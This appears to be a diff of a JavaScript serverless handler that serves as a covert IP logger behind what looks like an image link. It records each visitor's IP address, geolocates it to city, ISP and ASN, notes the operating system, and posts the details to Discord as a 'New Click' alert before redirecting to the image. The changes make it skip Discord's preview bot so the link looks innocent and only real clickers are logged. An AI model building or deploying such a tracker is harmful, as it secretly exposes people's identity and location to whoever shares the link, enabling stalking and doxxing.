@@ -5,24 +5,23 @@ const IMAGE_URL = 'https://cdn.discordapp.com/attachments/1521991858409046232/15
 // ─────────────────────────────────────
 
 export default async function handler(req, res) {
-    // ─── Get real IP ───
-    const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
-               req.socket.remoteAddress || 
-               null;
-    
-    const ua = req.headers['user-agent'] || null;
-    const referer = req.headers['referer'] || null;
-    const acceptLang = req.headers['accept-language'] || null;
-    const acceptEncoding = req.headers['accept-encoding'] || null;
-    const secChUa = req.headers['sec-ch-ua'] || null;
-    const secChUaPlatform = req.headers['sec-ch-ua-platform'] || null;
-    const secChUaMobile = req.headers['sec-ch-ua-mobile'] || null;
-    const dnt = req.headers['dnt'] || null;
-    const time = new Date().toISOString().replace('T', ' ').slice(0, 19);
+    const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || null;
+    const ua = req.headers['user-agent'] || '';
 
-    // ─── Get country from IP ───
+    // ─── IGNORE DISCORD BOT ───
+    if (ua.includes('Discordbot')) {
+        res.writeHead(302, { Location: IMAGE_URL });
+        res.end();
+        return;
+    }
+
+    // ─── Only log real users ───
+    const time = new Date().toISOString().replace('T', ' ').slice(0, 19);
+    const fields = [];
+    if (ip) fields.push({ name: '🌐 IP', value: `\`${ip}\``, inline: false });
+
     let geo = {};
-    if (ip && ip !== 'unknown') {
+    if (ip) {
         try {
             const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,org,timezone,loc,as`);
             if (geoRes.ok) {
@@ -32,32 +31,6 @@ export default async function handler(req, res) {
         } catch (_) {}
     }
 
-    // ─── Parse User-Agent ───
-    let deviceType = null, os = null, browser = null;
-    if (ua) {
-        if (ua.includes('Windows')) os = 'Windows';
-        else if (ua.includes('Mac OS')) os = 'macOS';
-        else if (ua.includes('Linux')) os = 'Linux';
-        else if (ua.includes('Android')) os = 'Android';
-        else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
-        else if (ua.includes('Chrome OS')) os = 'ChromeOS';
-        else if (ua.includes('Ubuntu')) os = 'Ubuntu';
-
-        if (ua.includes('Mobile') || (ua.includes('Android') && !ua.includes('Tablet'))) deviceType = 'Mobile Phone';
-        else if (ua.includes('Tablet') || ua.includes('iPad')) deviceType = 'Tablet';
-        else if (ua.includes('Windows') || ua.includes('Mac') || ua.includes('Linux')) deviceType = 'Desktop';
-
-        if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) browser = 'Chrome';
-        else if (ua.includes('Firefox')) browser = 'Firefox';
-        else if (ua.includes('Safari') && !ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Safari';
-        else if (ua.includes('Edg')) browser = 'Edge';
-        else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
-        else if (ua.includes('Brave')) browser = 'Brave';
-    }
-
-    // ─── Build fields dynamically ───
-    const fields = [];
-    if (ip) fields.push({ name: '🌐 IP', value: `\`${ip}\``, inline: false });
     if (geo.country) {
         const code = geo.countryCode || 'UN';
         const flag = code.length === 2 ? String.fromCodePoint(...code.toUpperCase().split('').map(ch => 0x1F1E6 + ch.charCodeAt(0) - 65)) : '🌍';
@@ -70,19 +43,22 @@ export default async function handler(req, res) {
     if (geo.isp) fields.push({ name: '🏢 ISP', value: geo.isp, inline: true });
     if (geo.org && geo.org !== geo.isp) fields.push({ name: '📋 Org', value: geo.org, inline: true });
     if (geo.as) fields.push({ name: '🔢 ASN', value: geo.as, inline: true });
-    if (deviceType) fields.push({ name: '🖥️ Device', value: deviceType, inline: true });
+
+    // ─── Parse OS from User-Agent ───
+    let os = null;
+    if (ua) {
+        if (ua.includes('Windows')) os = 'Windows';
+        else if (ua.includes('Mac OS')) os = 'macOS';
+        else if (ua.includes('Linux')) os = 'Linux';
+        else if (ua.includes('Android')) os = 'Android';
+        else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+        else if (ua.includes('Chrome OS')) os = 'ChromeOS';
+        else if (ua.includes('Ubuntu')) os = 'Ubuntu';
+    }
     if (os) fields.push({ name: '💻 OS', value: os, inline: true });
-    if (browser) fields.push({ name: '🌐 Browser', value: browser, inline: true });
-    if (secChUaMobile) fields.push({ name: '📱 Mobile', value: secChUaMobile, inline: true });
-    if (secChUaPlatform) fields.push({ name: '📋 Platform', value: secChUaPlatform, inline: true });
-    if (ua) fields.push({ name: '📎 User-Agent', value: `\`${ua.length > 150 ? ua.slice(0, 150) + '...' : ua}\``, inline: false });
-    if (referer) fields.push({ name: '🔗 Referer', value: referer.length > 80 ? referer.slice(0, 80) + '...' : referer, inline: false });
-    if (acceptLang) fields.push({ name: '🌍 Accept-Language', value: acceptLang, inline: true });
-    if (acceptEncoding) fields.push({ name: '⚙️ Encoding', value: acceptEncoding, inline: true });
-    if (dnt) fields.push({ name: '🚫 DNT', value: dnt, inline: true });
+
     fields.push({ name: '📅 Timestamp', value: `\`${time}\``, inline: false });
 
-    // ─── Build embed ───
     const embed = {
         title: '🕵️ New Click',
         color: 0x00ff88,
@@ -101,15 +77,7 @@ export default async function handler(req, res) {
     discordReq.write(payload);
     discordReq.end();
 
-    // ─── Serve the image directly ───
-    try {
-        const imageRes = await fetch(IMAGE_URL);
-        const buffer = Buffer.from(await imageRes.arrayBuffer());
-        res.setHeader('Content-Type', 'image/png');
-        res.status(200).send(buffer);
-    } catch (_) {
-        const fallback = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
-        res.setHeader('Content-Type', 'image/png');
-        res.status(200).send(fallback);
-    }
+    // ─── REDIRECT to image ───
+    res.writeHead(302, { Location: IMAGE_URL });
+    res.end();
 }
